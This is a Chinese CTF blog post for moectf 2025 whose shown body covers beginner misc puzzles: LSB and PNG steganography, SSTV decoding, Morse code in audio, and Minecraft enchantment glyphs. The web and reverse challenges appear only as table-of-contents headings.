<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="miscez_LSB放入stegsolve.jar  base64解密为：  SSTV 查询到可以用qsstv程序进行解码来恢复图片。初次尝试发现附件不能直接放进qsstv，需要删掉下图LIST蓝色部分（生成软件FFmpeg（Lavf57.52.100）的标识）才能被qsstv正常解析  如下图：         捂住一只耳Au打开音频文件，发现左声道音轨有长短不一的段，推测是摩斯电码。  看着然">
<meta property="og:type" content="article">
<meta property="og:title" content="moectf 2025 misc&amp;web">
<meta property="og:url" content="http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/index.html">
<meta property="og:site_name" content="y@7q">
<meta property="og:description" content="miscez_LSB放入stegsolve.jar  base64解密为：  SSTV 查询到可以用qsstv程序进行解码来恢复图片。初次尝试发现附件不能直接放进qsstv，需要删掉下图LIST蓝色部分（生成软件FFmpeg（Lavf57.52.100）的标识）才能被qsstv正常解析  如下图：         捂住一只耳Au打开音频文件，发现左声道音轨有长短不一的段，推测是摩斯电码。  看着然">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809091924046.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809092038387.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809124932711.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809125512092.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809125000466.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809130648614.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809130601797.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809135238038.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/upload.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/v2-ac82eae95727bb137d3c2576c9fbd44e_r.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809144105737.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816192604657.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816192529395.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816214224669.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816214602128.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816214627559.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816214757580.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250810224401937.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809093143395.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809092831525.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/1754704474303.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809102826870.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809100920501.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809103054218.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809103705485.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250810010141567.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250810004843141.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250810005037719.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816093146120.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816093936526.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816093722827.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816093845651.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816094557113.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816094811605.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816100336696.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816102907000.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816114743022.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250816191544848.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250824131004.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250823140558.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250823141815.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250823144833.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250823103625.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250906175346.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250822110845.png">
<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250822111037.png">
<meta property="article:published_time" content="2025-10-09T07:40:51.000Z">
<meta property="article:modified_time" content="2025-10-16T17:41:12.526Z">
<meta property="article:author" content="y@7q">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809091924046.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>moectf 2025 misc&amp;web</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/%E6%9D%82%E8%B0%88/%E3%80%8ASteins;Gate%E3%80%8B%E6%B8%B8%E7%8E%A9%E5%90%8E%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&text=moectf 2025 misc&amp;web"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&is_video=false&description=moectf 2025 misc&amp;web"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=moectf 2025 misc&amp;web&body=Check out this article: http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&title=moectf 2025 misc&amp;web"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&name=moectf 2025 misc&amp;web&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/CTF%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/moectf2025/&t=moectf 2025 misc&amp;web"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-LSB"><span class="toc-number">1.1.</span> <span class="toc-text">ez_LSB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTV"><span class="toc-number">1.2.</span> <span class="toc-text">SSTV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%82%E4%BD%8F%E4%B8%80%E5%8F%AA%E8%80%B3"><span class="toc-number">1.3.</span> <span class="toc-text">捂住一只耳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enchantment"><span class="toc-number">1.4.</span> <span class="toc-text">Enchantment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-png"><span class="toc-number">1.5.</span> <span class="toc-text">ez_png</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encrypted-pdf"><span class="toc-number">1.6.</span> <span class="toc-text">encrypted_pdf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-ssl"><span class="toc-number">1.7.</span> <span class="toc-text">ez_ssl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebRepo"><span class="toc-number">1.8.</span> <span class="toc-text">WebRepo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weird-photo"><span class="toc-number">1.9.</span> <span class="toc-text">weird_photo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%9F%BA%E7%B1%B3%E9%9A%BE%E6%B2%A1%E9%9C%B2%E8%BA%B2"><span class="toc-number">2.</span> <span class="toc-text">哈基米难没露躲</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1"><span class="toc-number">4.</span> <span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">4.1.</span> <span class="toc-text">0 Web入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="toc-number">4.2.</span> <span class="toc-text">01 第一章 神秘的手镯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="toc-number">4.3.</span> <span class="toc-text">02 第二章 初识金曦玄轨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="toc-number">4.4.</span> <span class="toc-text">03 第三章 问剑石！篡天改命！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="toc-number">4.5.</span> <span class="toc-text">04 第四章 金曦破禁与七绝傀儡阵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="toc-number">4.6.</span> <span class="toc-text">05 第五章 打上门来！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="toc-number">4.7.</span> <span class="toc-text">06 第六章 藏经禁制？玄机初探！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="toc-number">4.8.</span> <span class="toc-text">07 第七章 灵蛛探穴与阴阳双生符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3"><span class="toc-number">4.9.</span> <span class="toc-text">08 第八章 天衍真言，星图显圣</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Moe%E7%AC%91%E4%BC%A0%E4%B9%8B%E7%8C%9C%E7%8C%9C%E7%88%86"><span class="toc-number">4.10.</span> <span class="toc-text">Moe笑传之猜猜爆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2"><span class="toc-number">5.</span> <span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#09-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="toc-number">5.1.</span> <span class="toc-text">09 第九章 星墟禁制·天机问路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E9%80%9A%E5%B9%BD%E5%85%B3%C2%B7%E7%81%B5%E7%BA%B9%E8%AF%A1%E5%BD%B1"><span class="toc-number">5.2.</span> <span class="toc-text">13 第十三章 通幽关·灵纹诡影</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E5%BE%A1%E7%A5%9E%E5%85%B3%C2%B7%E8%A1%A5%E5%A4%A9%E7%8E%89%E7%A2%91"><span class="toc-number">5.3.</span> <span class="toc-text">14 第十四章 御神关·补天玉碑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="toc-number">5.4.</span> <span class="toc-text">12 第十二章 玉魄玄关·破妄</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%91%B8%E9%87%91%E5%81%B6%E9%81%87FLAG%EF%BC%8C%E6%8B%BC%E5%B0%BD%E5%85%A8%E5%8A%9B%E9%9A%BE%E6%88%98%E8%83%9C"><span class="toc-number">5.5.</span> <span class="toc-text">摸金偶遇FLAG，拼尽全力难战胜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="toc-number">5.6.</span> <span class="toc-text">10 第十章 天机符阵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="toc-number">5.7.</span> <span class="toc-text">11 第十一章 千机变·破妄之眼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5-revenge"><span class="toc-number">5.8.</span> <span class="toc-text">10 第十章 天机符阵_revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3"><span class="toc-number">6.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF-revenge"><span class="toc-number">6.1.</span> <span class="toc-text">01 第一章 神秘的手镯_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AB%A0-%E5%BD%92%E7%9C%9F%E5%85%B3%C2%B7%E7%AB%9E%E6%97%B6%E5%87%80%E9%AD%94"><span class="toc-number">6.2.</span> <span class="toc-text">15 第十五章 归真关·竞时净魔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0-%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94"><span class="toc-number">6.3.</span> <span class="toc-text">16 第十六章 昆仑星途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="toc-number">6.4.</span> <span class="toc-text">17 第十七章 星骸迷阵·神念重构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-%E7%AC%AC%E5%8D%81%E5%85%AB%E7%AB%A0-%E4%B8%87%E5%8D%B7%E8%AF%A1%E9%98%81%C2%B7%E5%8A%9F%E6%B3%95%E8%BF%9E%E7%8E%AF"><span class="toc-number">6.5.</span> <span class="toc-text">18 第十八章 万卷诡阁·功法连环</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-%E6%98%9F%E7%A9%B9%E7%9C%9F%E7%9B%B8%C2%B7%E8%A1%A5%E5%A4%A9%E5%BD%92%E6%BA%90"><span class="toc-number">6.6.</span> <span class="toc-text">19 第十九章 星穹真相·补天归源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-revenge"><span class="toc-number">6.7.</span> <span class="toc-text">19 第十九章_revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4"><span class="toc-number">7.</span> <span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell%EF%BC%9F"><span class="toc-number">7.1.</span> <span class="toc-text">这是…Webshell？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell-revenge"><span class="toc-number">7.2.</span> <span class="toc-text">这是…Webshell?_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0-%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="toc-number">7.3.</span> <span class="toc-text">20 第二十章 幽冥血海·幻语心魔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%BE%80%E7%94%9F%E6%BC%A9%E6%B6%A1%C2%B7%E8%A8%80%E7%81%B5%E6%AD%BB%E5%B1%80"><span class="toc-number">7.4.</span> <span class="toc-text">21 第二十一章 往生漩涡·言灵死局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0%EF%BC%9A%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%C2%B7%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5"><span class="toc-number">7.5.</span> <span class="toc-text">22 第二十二章：血海核心·千年手段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">8.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#upx"><span class="toc-number">8.1.</span> <span class="toc-text">upx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez3"><span class="toc-number">8.2.</span> <span class="toc-text">ez3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flower"><span class="toc-number">8.3.</span> <span class="toc-text">flower</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#catch"><span class="toc-number">8.4.</span> <span class="toc-text">catch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpy"><span class="toc-number">8.5.</span> <span class="toc-text">ezpy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-cup-of-tea"><span class="toc-number">8.6.</span> <span class="toc-text">A cup of tea</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Two-cups-of-tea"><span class="toc-number">8.7.</span> <span class="toc-text">Two cups of tea</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        moectf 2025 misc&amp;web
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">y@7q</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-10-09T07:40:51.000Z" class="dt-published" itemprop="datePublished">2025-10-09</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ez-LSB"><a href="#ez-LSB" class="headerlink" title="ez_LSB"></a><strong>ez_LSB</strong></h3><p>放入stegsolve.jar</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809091924046.png" alt="image-20250809091924046"></p>
<p>base64解密为：</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809092038387.png" alt="image-20250809092038387"></p>
<h3 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a><strong>SSTV</strong></h3><p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809124932711.png" alt="image-20250809124932711"></p>
<p>查询到可以用qsstv程序进行解码来恢复图片。<br>初次尝试发现附件不能直接放进qsstv，需要删掉下图LIST蓝色部分（生成软件FFmpeg（Lavf57.52.100）的标识）才能被qsstv正常解析</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809125512092.png" alt="image-20250809125512092"></p>
<p>如下图：</p>
<img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809125000466.png" alt="image-20250809125000466"  />







<h3 id="捂住一只耳"><a href="#捂住一只耳" class="headerlink" title="捂住一只耳"></a>捂住一只耳</h3><p>Au打开音频文件，发现左声道音轨有长短不一的段，推测是摩斯电码。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809130648614.png" alt="image-20250809130648614"></p>
<p>看着然后手敲下来：<code>..-./.-../.-/--./../.../---.../..../.-/.-../..-./..--.-/.-./.-/-../../---/..--.-/../-./..--.-/-..-/-../..-/</code></p>
<p>解码可得：</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809130601797.png" alt="image-20250809130601797"></p>
<h3 id="Enchantment"><a href="#Enchantment" class="headerlink" title="Enchantment"></a><strong>Enchantment</strong></h3><p>流量包中提取到图片：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809135238038.png" alt="image-20250809135238038"></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/upload.png" alt="upload"></p>
<p>题目描述flag和上面的怪异文字有关，于是搜索相关关键词<code>mc 附魔台 文字</code>可以得到翻译表，<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/v2-ac82eae95727bb137d3c2576c9fbd44e_r.jpg" alt="Minecraft附魔台符文"></p>
<p>对照翻译结果，然后按题目处理后提交即可。</p>
<h3 id="ez-png"><a href="#ez-png" class="headerlink" title="ez_png"></a><strong>ez_png</strong></h3><p>题目提示flag和文件骨骼有关，了解到应该是IDAT块隐写。</p>
<p>用pngcheck查看确认一下：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250809144105737.png" alt="image-20250809144105737"></p>
<p>可以看到倒数第二个块没满就开始了最后一个块的填充，说明最后一块有问题。</p>
